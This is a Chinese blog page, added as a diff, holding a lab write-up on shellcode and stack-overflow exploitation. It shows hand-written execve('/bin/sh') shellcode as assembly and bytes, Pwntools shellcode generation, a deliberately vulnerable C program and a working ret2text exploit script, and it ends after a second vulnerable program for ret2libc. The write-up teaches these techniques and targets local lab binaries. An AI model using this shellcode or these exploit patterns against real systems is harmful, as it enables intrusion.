@@ -1,0 +1,612 @@
+
+<!DOCTYPE html>
+<html lang="en ">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>宏兴的博客 || ShellCode编写与二进制漏洞挖掘（ret2text / ret2libc）</title>
+    <meta name="author" content="宏兴">
+    <meta name="description" content=" ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/images/PY.png">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/full-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body>
+
+    <div id="loading"
+        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div
+            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent"
+                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p>加载过慢请开启缓存(浏览器默认开启)</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">宏兴的博客</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled" />
+            </span>
+            <span>首页</span>
+        </a>
+        
+        <a href="/about">
+            <span>
+                <a-icon type="idcard" theme="filled" />
+            </span>
+            <span>关于</span>
+        </a>
+        
+        <a href="/archives">
+            <span>
+                <a-icon type="folder" theme="filled" />
+            </span>
+            <span>归档</span>
+        </a>
+        
+        <a href="/categories">
+            <span>
+                <a-icon type="book" theme="filled" />
+            </span>
+            <span>分类</span>
+        </a>
+        
+        <a href="/tags">
+            <span>
+                <a-icon type="tags" theme="filled" />
+            </span>
+            <span>标签</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled" />
+            </span>
+            <span>宏兴的博客</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">首页</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="idcard" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">关于</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="folder" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">归档</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="book" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">分类</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="tags" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">标签</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>ShellCode编写与二进制漏洞挖掘（ret2text / ret2libc） </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2026/6/2
+        </span>
+
+        
+        <span class="category">
+            <a href="/categories/技术实践">
+                <span class="icon">
+                    <a-icon type="book" theme="filled" />
+                </span>
+                技术实践
+            </a>
+        </span>
+        
+
+        
+
+        <span class="tags">
+            <span class="icon">
+                <a-icon type="tags" theme="filled" />
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/ShellCode" style=color:#ffa2c4>
+                    ShellCode
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/Pwntools" style=color:#00bcd4>
+                    Pwntools
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/ROP" style=color:#00a596>
+                    ROP
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/ret2text" style=color:#ff7d73>
+                    ret2text
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/ret2libc" style=color:#00a596>
+                    ret2libc
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/GDB" style=color:#ffa2c4>
+                    GDB
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+
+    <div class="content" v-pre>
+        <p>本实验围绕 ShellCode 的编写与生成、以及二进制漏洞挖掘中的 ROP 利用展开，包含两个实验内容：</p>
+<ul>
+<li><strong>实验三</strong>：ShellCode 的概念、手工编写与 Pwntools 自动生成</li>
+<li><strong>实验四</strong>：基于栈溢出的 ROP 攻击——ret2text 与 ret2libc</li>
+</ul>
+<span id="more"></span>
+
+<hr>
+<h1 id="实验三：ShellCode"><a href="#实验三：ShellCode" class="headerlink" title="实验三：ShellCode"></a>实验三：ShellCode</h1><h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h2><ol>
+<li>掌握 ShellCode 的概念、编写（生成）、验证方法</li>
+<li>Pwntools 的安装与使用，利用 Pwntools 生成 ShellCode</li>
+<li>掌握函数调用的步骤</li>
+<li>Linux 下 GDB 常用调试命令的使用</li>
+</ol>
+<h2 id="二、实验原理与步骤"><a href="#二、实验原理与步骤" class="headerlink" title="二、实验原理与步骤"></a>二、实验原理与步骤</h2><h3 id="（一）ShellCode-概述"><a href="#（一）ShellCode-概述" class="headerlink" title="（一）ShellCode 概述"></a>（一）ShellCode 概述</h3><p>ShellCode 是一段利用软件漏洞而执行的代码，常用机器语言编写，用于获取目标系统的 Shell。ShellCode 按照执行位置分为<strong>本地 ShellCode</strong>（常用于提权）和<strong>远程 ShellCode</strong>（通过套接字为攻击者提供 Shell 访问）。根据连接方式不同，分为反向 Shell、正向 Shell 和套接字重用 Shell。</p>
+<p>获取 ShellCode 的方式很多，主要包括：</p>
+<ul>
+<li>直接编写汇编代码</li>
+<li>Pwntools 生成</li>
+<li>网上查找（如 shell-storm.org）</li>
+<li>Metasploit (msfvenom) 生成</li>
+<li>CobaltStrike 生成</li>
+</ul>
+<hr>
+<h3 id="方法-1：手工编写-ShellCode"><a href="#方法-1：手工编写-ShellCode" class="headerlink" title="方法 1：手工编写 ShellCode"></a>方法 1：手工编写 ShellCode</h3><h4 id="步骤-1：编写-C-语言源码"><a href="#步骤-1：编写-C-语言源码" class="headerlink" title="步骤 1：编写 C 语言源码"></a>步骤 1：编写 C 语言源码</h4><p>思路：先分析 C 代码对应的汇编代码，然后提取机器码作为 ShellCode。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// shellcode.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">    execve(<span class="string">&quot;/bin/sh&quot;</span>, <span class="number">0</span>, <span class="number">0</span>); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>execve 函数说明：</strong></p>
+<p><code>execve</code> 是 Linux 系统中用于执行新程序的系统调用，原型如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">execve</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">char</span> *<span class="type">const</span> argv[], <span class="type">char</span> *<span class="type">const</span> envp[])</span>;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>pathname</code>：要执行的程序的路径</li>
+<li><code>argv</code>：传递给新程序的命令行参数数组，以 NULL 结尾</li>
+<li><code>envp</code>：传递给新程序的环境变量数组，以 NULL 结尾</li>
+</ul>
+<p>执行成功后替换当前进程映像，不返回值；失败返回 -1。</p>
+<h4 id="步骤-2：编译并测试"><a href="#步骤-2：编译并测试" class="headerlink" title="步骤 2：编译并测试"></a>步骤 2：编译并测试</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 shellcode.c -o shellcode</span><br><span class="line">./shellcode</span><br><span class="line"><span class="comment"># 再执行 ls 测试 shell 是否正常</span></span><br></pre></td></tr></table></figure>
+
+<p>成功获取系统 Shell。</p>
+<h4 id="步骤-3：GDB-调试分析"><a href="#步骤-3：GDB-调试分析" class="headerlink" title="步骤 3：GDB 调试分析"></a>步骤 3：GDB 调试分析</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb shellcode</span><br><span class="line">(gdb) disas main</span><br></pre></td></tr></table></figure>
+
+<p>反汇编 main 函数，观察调用 execve 前的参数传递。三个参数（0, 0, 0x56557008）被压入栈中，其中 <code>0x56557008</code> 存储的是 <code>&quot;/bin/sh&quot;</code> 字符串。</p>
+<p>继续执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) <span class="built_in">break</span> execve</span><br><span class="line">(gdb) run</span><br></pre></td></tr></table></figure>
+
+<p>进入 execve 内部，观察寄存器状态：</p>
+<ul>
+<li><code>eax = 0xb</code>（系统调用号）</li>
+<li><code>ebx = &quot;/bin/sh&quot;</code>（第一个参数）</li>
+<li><code>ecx = 0</code>（第二个参数）</li>
+<li><code>edx = 0</code>（第三个参数）</li>
+</ul>
+<p>最终通过 <code>int 0x80</code> 指令触发系统调用。</p>
+<h4 id="步骤-4：编写汇编-ShellCode"><a href="#步骤-4：编写汇编-ShellCode" class="headerlink" title="步骤 4：编写汇编 ShellCode"></a>步骤 4：编写汇编 ShellCode</h4><p>根据以上分析，编写汇编版 ShellCode：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">; shellcode.asm</span><br><span class="line">SECTION .text</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    xor edx, edx</span><br><span class="line">    push edx</span><br><span class="line">    push &quot;//sh&quot;</span><br><span class="line">    push &quot;/bin&quot;</span><br><span class="line">    mov ebx, esp</span><br><span class="line">    xor eax, eax</span><br><span class="line">    mov al, 0Bh</span><br><span class="line">    int 80h</span><br></pre></td></tr></table></figure>
+
+<p>编译链接并测试：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf32 -o shellcode.o shellcode.asm</span><br><span class="line">ld -m elf_i386 shellcode.o -o shellcode1</span><br><span class="line">./shellcode1</span><br><span class="line"><span class="comment"># 执行 ls 验证</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤-5：提取机器码"><a href="#步骤-5：提取机器码" class="headerlink" title="步骤 5：提取机器码"></a>步骤 5：提取机器码</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d shellcode1</span><br></pre></td></tr></table></figure>
+
+<p>得到机器码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80</span><br></pre></td></tr></table></figure>
+
+<p>编写 C 语言测试代码，将 ShellCode 作为函数指针执行：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> shellcode[] = </span><br><span class="line">        <span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69&quot;</span></span><br><span class="line">        <span class="string">&quot;\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    (*(<span class="type">void</span>(*)())shellcode)();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="方法-2：通过-Pwntools-生成-ShellCode"><a href="#方法-2：通过-Pwntools-生成-ShellCode" class="headerlink" title="方法 2：通过 Pwntools 生成 ShellCode"></a>方法 2：通过 Pwntools 生成 ShellCode</h3><h4 id="安装-Pwntools"><a href="#安装-Pwntools" class="headerlink" title="安装 Pwntools"></a>安装 Pwntools</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pwntools</span><br></pre></td></tr></table></figure>
+
+<p>验证安装：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import pwn; print(pwn.__version__)&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="使用-Pwntools-生成-ShellCode"><a href="#使用-Pwntools-生成-ShellCode" class="headerlink" title="使用 Pwntools 生成 ShellCode"></a>使用 Pwntools 生成 ShellCode</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shellcode_pwntools.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>)</span><br><span class="line">shellcode = shellcraft.sh()</span><br><span class="line"><span class="built_in">print</span>(shellcode)</span><br></pre></td></tr></table></figure>
+
+<p>运行脚本，Pwntools 会自动生成适用于 32 位 Linux 的 <code>execve(&quot;/bin/sh&quot;)</code> 的 ShellCode。</p>
+<p>将生成的 ShellCode 复制到 C 语言测试代码（funcall12.c）中，编译运行，成功获取系统 Shell。</p>
+<hr>
+<h1 id="实验四：二进制漏洞挖掘"><a href="#实验四：二进制漏洞挖掘" class="headerlink" title="实验四：二进制漏洞挖掘"></a>实验四：二进制漏洞挖掘</h1><h2 id="一、实验目的-1"><a href="#一、实验目的-1" class="headerlink" title="一、实验目的"></a>一、实验目的</h2><ol>
+<li>掌握 Python 中的 Pwntools 工具，利用 Pwntools 生成 ShellCode 和编写 exp</li>
+<li>掌握 ROP 攻击的三种形式：ret2text、ret2shellcode、ret2libc</li>
+<li>课程思政：软件逆向分析相关知识较难理解，且是大家将来工作和学习过程中都会遇到，大家要积极主动学习，举一反三，以学习 C 语言逆向为基础，学习其他逆向知识，培养个人终身学习能力和对软件逆向分析深入全面掌握的工匠精神</li>
+</ol>
+<h2 id="二、实验原理"><a href="#二、实验原理" class="headerlink" title="二、实验原理"></a>二、实验原理</h2><h3 id="1-Pwntools-常用函数"><a href="#1-Pwntools-常用函数" class="headerlink" title="1. Pwntools 常用函数"></a>1. Pwntools 常用函数</h3><p>Pwntools 是一个用于 CTF 比赛和漏洞利用开发的 Python 库。</p>
+<p><strong>连接与交互：</strong></p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>remote(&quot;ip&quot;, port)</code></td>
+<td>连接远程主机</td>
+</tr>
+<tr>
+<td><code>process(&quot;./filename&quot;)</code></td>
+<td>连接本地程序</td>
+</tr>
+<tr>
+<td><code>send(payload)</code></td>
+<td>发送 payload</td>
+</tr>
+<tr>
+<td><code>sendline(payload)</code></td>
+<td>发送带换行符的 payload</td>
+</tr>
+<tr>
+<td><code>sendafter(string, payload)</code></td>
+<td>接收到指定字符串后发送</td>
+</tr>
+<tr>
+<td><code>recvn(n)</code></td>
+<td>接收 n 个字符</td>
+</tr>
+<tr>
+<td><code>recvline()</code></td>
+<td>接收一行</td>
+</tr>
+<tr>
+<td><code>recvlines(n)</code></td>
+<td>接收 n 行</td>
+</tr>
+<tr>
+<td><code>recvuntil(string)</code></td>
+<td>接收到指定字符串为止</td>
+</tr>
+</tbody></table>
+<p><strong>数据处理：</strong></p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>p32(整数)</code> &#x2F; <code>p64(整数)</code></td>
+<td>整数转小端序字节流</td>
+</tr>
+<tr>
+<td><code>shellcraft</code></td>
+<td>生成 ShellCode</td>
+</tr>
+<tr>
+<td><code>ELF(path)</code></td>
+<td>解析 ELF 文件</td>
+</tr>
+<tr>
+<td><code>ELF.symbols[&#39;func&#39;]</code></td>
+<td>获取函数地址</td>
+</tr>
+<tr>
+<td><code>ELF.got[&#39;func&#39;]</code></td>
+<td>获取 GOT 表项</td>
+</tr>
+<tr>
+<td><code>ELF.plt[&#39;func&#39;]</code></td>
+<td>获取 PLT 表项</td>
+</tr>
+</tbody></table>
+<h3 id="2-进程的内存划分"><a href="#2-进程的内存划分" class="headerlink" title="2. 进程的内存划分"></a>2. 进程的内存划分</h3><p>进程在内存中的通用组织形式：</p>
+<ul>
+<li><strong>BSS 段</strong>：存放未初始化或初始化为 0 的全局&#x2F;静态变量，可读写，执行前自动清零</li>
+<li><strong>数据段</strong>：存放已初始化的全局变量</li>
+<li><strong>代码段 (.text)</strong>：存放程序指令，通常只读可执行</li>
+<li><strong>堆</strong>：动态分配内存</li>
+<li><strong>栈</strong>：局部变量、函数调用信息</li>
+</ul>
+<h3 id="3-Linux-保护机制"><a href="#3-Linux-保护机制" class="headerlink" title="3. Linux 保护机制"></a>3. Linux 保护机制</h3><table>
+<thead>
+<tr>
+<th>保护机制</th>
+<th>说明</th>
+<th>编译选项</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>NX</strong> (栈不可执行)</td>
+<td>栈和堆标记为不可执行，防注入代码</td>
+<td><code>-z execstack</code> &#x2F; <code>-z noexecstack</code></td>
+</tr>
+<tr>
+<td><strong>Canary</strong></td>
+<td>栈中插入 cookie 值，防止栈溢出</td>
+<td><code>-fno-stack-protector</code> &#x2F; <code>-fstack-protector</code></td>
+</tr>
+<tr>
+<td><strong>PIE</strong></td>
+<td>代码地址随机化</td>
+<td><code>--enable-default-pie</code> &#x2F; <code>-no-pie</code></td>
+</tr>
+<tr>
+<td><strong>ASLR</strong></td>
+<td>地址空间分布随机化（内核级别）</td>
+<td><code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></td>
+</tr>
+<tr>
+<td><strong>RELRO</strong></td>
+<td>重定位表只读保护</td>
+<td><code>-z norelro</code> &#x2F; <code>-z lazy</code> &#x2F; <code>-z now</code></td>
+</tr>
+</tbody></table>
+<p><strong>ASLR 级别：</strong></p>
+<ul>
+<li><code>0</code>：禁用</li>
+<li><code>1</code>：保守随机化</li>
+<li><code>2</code>：完全随机化（默认）</li>
+</ul>
+<p><strong>ASLR 与 PIE 组合效果：</strong></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>NO PIE</th>
+<th>Full PIE</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ASLR&#x3D;0</td>
+<td>代码、libc、堆、栈都不变</td>
+<td>代码、libc、堆、栈都不变</td>
+</tr>
+<tr>
+<td>ASLR&#x3D;1</td>
+<td>libc、栈会变；代码、堆不变</td>
+<td>代码、libc、堆、栈都变；代码与堆相对偏移不变</td>
+</tr>
+<tr>
+<td>ASLR&#x3D;2</td>
+<td>libc、栈、堆会变；代码不变</td>
+<td>代码、libc、堆、栈都变；相对偏移也变</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="三、实验步骤"><a href="#三、实验步骤" class="headerlink" title="三、实验步骤"></a>三、实验步骤</h2><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>ret2text 是栈溢出利用的一种形式，利用程序自身已有的代码（<code>.text</code> 段）中的函数来实现攻击。</p>
+<h4 id="步骤-1：编写漏洞程序"><a href="#步骤-1：编写漏洞程序" class="headerlink" title="步骤 1：编写漏洞程序"></a>步骤 1：编写漏洞程序</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ret2text.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> sh[] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    system(sh);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">dofunc</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">8</span>] = &#123;&#125;;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x100</span>);  <span class="comment">// 栈溢出漏洞：buf 只有 8 字节，却可读入 0x100 字节</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    dofunc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤-2：编译并关闭保护"><a href="#步骤-2：编译并关闭保护" class="headerlink" title="步骤 2：编译并关闭保护"></a>步骤 2：编译并关闭保护</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -Wno-stringop-overflow -fno-stack-protector ret2text.c -o ret2text</span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤-3：确定偏移量"><a href="#步骤-3：确定偏移量" class="headerlink" title="步骤 3：确定偏移量"></a>步骤 3：确定偏移量</h4><p>使用 Pwndbg 调试，在 read 函数处下断点，输入 <code>cyclic 200</code> 生成的字符，观察 EBP 中的值。</p>
+<p>执行 <code>cyclic -l eaaa</code> 得到 <strong>buf 与 ebp 距离为 16 字节（0x10）</strong>。</p>
+<h4 id="步骤-4：查看-func-函数地址"><a href="#步骤-4：查看-func-函数地址" class="headerlink" title="步骤 4：查看 func 函数地址"></a>步骤 4：查看 func 函数地址</h4><p>使用 IDA 或 <code>info func</code> 命令查看，得到 func 函数地址为 <code>0x000011bd</code>（启用 PIE 后实际地址会偏移基址）。</p>
+<h4 id="步骤-5：编写-exploit"><a href="#步骤-5：编写-exploit" class="headerlink" title="步骤 5：编写 exploit"></a>步骤 5：编写 exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ret2text.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&quot;i386&quot;</span>, os = <span class="string">&quot;linux&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./ret2text&quot;</span>)</span><br><span class="line"></span><br><span class="line">padding2ebp = <span class="number">0x10</span></span><br><span class="line">sys_addr = <span class="number">0x565561bd</span>  <span class="comment"># func 实际地址</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (padding2ebp + <span class="number">4</span>) + p32(sys_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;input:&quot;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>成功获取 Shell。</p>
+<hr>
+<h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>ret2libc 控制程序执行 libc 中的函数（通常是 <code>system(&quot;/bin/sh&quot;)</code>），适用于程序自身没有现成的后门函数时。</p>
+<p><strong>分类：</strong></p>
+<ol>
+<li>程序自身含有 system 和 “&#x2F;bin&#x2F;sh”</li>
+<li>程序含有 system，没有 “&#x2F;bin&#x2F;sh”</li>
+<li>程序没有 system 和 “&#x2F;bin&#x2F;sh”，但给出了 libc.so</li>
+<li>程序没有 system 和 “&#x2F;bin&#x2F;sh”，也未给出 libc.so（需先泄露地址）</li>
+</ol>
+<p>下面演示第 1 类情况：</p>
+<h4 id="步骤-1：编写漏洞程序-1"><a href="#步骤-1：编写漏洞程序-1" class="headerlink" title="步骤 1：编写漏洞程序"></a>步骤 1：编写漏洞程序</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ret2libc.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> sh[]=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span>&#123;</span><br><span class="line">    system(<span class="string">&quot;abc&quot;</span>);  <span class="comment">// 参数不是 /bin/sh</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">dofunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">8</span>]=&#123;&#125;;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x100</span>);  <span class="comment">// 栈溢出</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">    dofunc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>与 ret2text 不同：ret2text 中 system 的参数是固定的 “&#x2F;bin&#x2F;sh”，可直接跳转；ret2libc 则需要手动在栈上布置 system 的参数。</p>
+</blockquote>
